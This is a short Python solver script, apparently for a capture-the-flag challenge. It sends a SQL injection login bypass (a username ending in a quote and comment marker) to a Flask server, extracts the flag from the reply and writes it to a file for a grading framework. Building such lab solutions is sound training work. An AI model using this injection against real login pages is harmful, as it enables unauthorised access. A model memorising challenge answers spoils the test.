#!/usr/bin/env python3
import requests
import re

# Send the request to the flask server.  Note that docker creates a DNS record
# for challenge that redirects to the correct instance.
r = requests.post(
    "http://challenge:5000/login",
    data={"username": "houdini'; --", "password": "does not matter"},
)

# Extract the flag.
flag = re.search(r" your flag:\s+([a-zA-Z0-9{}_-]+)", r.text).group(1)

# Write the flag out to where the framework will read it.
with open("flag", "w") as f:
    f.write(flag)
